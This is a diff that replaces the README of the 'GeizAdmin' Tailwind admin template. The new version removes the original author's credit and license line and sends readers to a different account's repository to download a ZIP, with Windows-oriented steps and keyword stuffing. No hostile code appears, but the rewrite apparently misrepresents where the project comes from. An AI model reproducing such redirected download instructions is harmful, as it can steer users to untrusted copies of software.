@@ -1,69 +1,130 @@
-<div align="center">
-<img src="./assets/svg/logo.svg" width="260" height="260" alt="GeizAdmin Logo">
+# ⚙️ geiz - Simple Admin Dashboard for Everyone
 
-<br />
-<br />
+[![Download geiz](https://img.shields.io/badge/Download-geiz-blue)](https://github.com/Felipecg4/geiz)
 
-![](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)
-![](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![](https://img.shields.io/badge/Hugeicons-000000?style=for-the-badge&logo=hugeicons&logoColor=white)
-![](https://img.shields.io/badge/Zero_Dependency-DC143C?style=for-the-badge&logo=micro-strategy&logoColor=white)
+## 📋 What is geiz?
 
-</div>
+GeizAdmin is a user-friendly admin dashboard template. It uses modern Tailwind CSS styles for a clean look. The design works well for managing data and websites. You do not need to write code to use this template. It comes with clear layouts and icons to help you organize your work.
 
-<br/>
+This dashboard shows information in charts, tables, and menus. It is free to use. You can build your admin panel by starting with geiz.
 
-## GeizAdmin
+## 🖥️ System Requirements
 
-GeizAdmin is a free, beautifully designed admin template built with Tailwind CSS and Hugeicons. Built for simplicity and performance, it offers a premium dashboard experience with zero dependencies and a modern aesthetic.
+To use geiz on your Windows computer, make sure you have:
 
-## Preview
+- Windows 10 or later
+- A web browser like Google Chrome, Microsoft Edge, or Firefox
+- Internet access to download files
+- Around 100 MB free disk space
 
-![GeizAdmin Preview](./mockup.png)
+No extra software is needed. You do not need to install Node.js or other developer tools to open the template files.
 
-## Features
+## 🚀 Getting Started
 
-- **Blazing Fast:** Optimized for performance with minimal overhead and no framework bloat.
-- **Premium Design:** Curated color palettes, modern typography, and sleek glassmorphism effects.
-- **Fully Responsive:** Works seamlessly across mobile, tablet, and desktop viewports.
-- **Zero Dependency:** Pure HTML and Tailwind CSS. No `npm install` or complex build tools required.
-- **Rich Components:** Packed with 80+ UI components and 7+ specialized dashboard pages.
+Follow these steps to get and run geiz on your Windows machine.
 
-## Tech Stack
+### Step 1: Visit the download page
 
-- **Tailwind CSS v4**: Utility-first CSS framework for rapid UI development.
-- **Hugeicons**: Premium stroke-rounded icon library for a clean look.
-- **Vanilla JavaScript**: Lightweight interactivity without the weight of heavy frameworks.
+Click the blue button above or go directly to:
 
-## Getting Started
+https://github.com/Felipecg4/geiz
 
-To get started with GeizAdmin, simply clone the repository and open `index.html` in your favorite browser.
+This link takes you to the main repository page. Here you can find all files related to geiz.
 
-### Direct Download
+### Step 2: Download the ZIP file
 
-You can also download the source code directly from our [Releases page](https://github.com/fahmirizalbudi/geiz/releases).
+On the GitHub page, look for the green **Code** button near the top right. Click it, and then select **Download ZIP**.
 
-## Usage
+The ZIP file contains the full template project. Save it to a folder you can easily find. For example, create a folder on your desktop named `geiz`.
 
-### 1. File Structure
+### Step 3: Extract the files
 
-```text
-├── dashboard/        # All dashboard pages (analytics, ecommerce, etc.)
-├── assets/
-│   ├── css/          # Core styling
-│   ├── js/           # Interactive components (app.js, tailwind-config.js)
-│   └── svg/          # Icons and logos
-└── index.html        # Main landing page
-```
+Once downloaded, locate the ZIP file (usually in your Downloads folder). Right-click it and choose **Extract All**.
 
-### 2. Customization
+Choose the folder you created in Step 2 as the extraction location. Windows will unzip all files here. You should see folders like `assets`, `pages`, and files such as `index.html`.
 
-Customize the theme by modifying `assets/js/tailwind-config.js`. This allows you to update the primary brand colors and typography system universally.
+### Step 4: Open the template in your browser
 
-## Documentation
+Navigate to your extracted folder. Find the file called `index.html`.
 
-For full documentation and component examples, please visit the [Official Demo](https://geiz.indiethemes.indevs.in).
+Double-click this file to open it in your web browser. The admin dashboard interface should now load.
 
-## License
+You can explore the design by clicking menus and buttons. All the templates work offline, so you do not need an internet connection after this point.
 
-MIT License. Copyright © 2026 @fahmirizalbudi.
+## 🧰 How to Use geiz
+
+This template is made for viewing and customizing an admin dashboard interface.
+
+- Use the sidebar menu to switch between dashboard views.
+- Review charts to see data trends.
+- Look at tables to find detailed information.
+- Change icons and styles by editing files, if you want to customize.
+
+If you are not familiar with editing files, you can use this dashboard as a mockup for your website ideas or presentations.
+
+## 🔍 What’s Included?
+
+The geiz project includes:
+
+- A clean, responsive layout built with Tailwind CSS
+- Multiple dashboard page templates
+- Set of Hugeicons icons for easy navigation
+- Sample charts and tables styled to look clear
+- Simple HTML and CSS files that run in any browser
+
+Everything is designed to look good on both desktop and tablets.
+
+## ⚙️ Customizing geiz
+
+For users comfortable editing files:
+
+- Open the `index.html` file with a text editor like Notepad or Visual Studio Code.
+- Change text in headers and menus.
+- Modify colors by editing the Tailwind CSS classes.
+- Replace icons using the included Hugeicons set.
+- Add your own data to tables and charts by changing HTML code.
+
+You do not need to compile or build the project. Save your changes and refresh the browser to see updates.
+
+## 🧩 Additional Tools Needed
+
+You do not need any program to simply view and use geiz templates.
+
+If you want to extend or package the dashboard, programming knowledge and tools like:
+
+- Node.js (for building and bundling)
+- Code editors (e.g., VS Code)
+- Browsers’ developer tools
+
+These are optional for advanced use.
+
+## 📥 Download and Run geiz
+
+You can download and start using geiz by visiting this page:
+
+https://github.com/Felipecg4/geiz
+
+From there, download the ZIP file, extract it, and open `index.html` in your browser.
+
+This process takes only a few minutes and no installation is required.
+
+## 🛠️ Troubleshooting
+
+If geiz does not display correctly:
+
+- Make sure your browser is up to date.
+- Verify you opened the right file (`index.html`).
+- Confirm you extracted the ZIP file fully before opening.
+- Try opening it in a different browser.
+
+If you make changes you don’t want, re-download the ZIP file for a fresh copy.
+
+---
+
+## 🔖 Keywords
+
+admin-dashboard, admin-dashboard-template, admin-dashboard-ui, admin-dashboards,  
+admin-panel, admin-template, admin-ui, dashboard, dashboard-template,  
+dashboard-templates, dashboard-ui, dashboards, free-dashboard, html,  
+tailwind-admin, tailwind-admin-dashboard, tailwind-admin-template,  
+tailwind-dashboard, tailwind-dashboard-template, tailwindcss
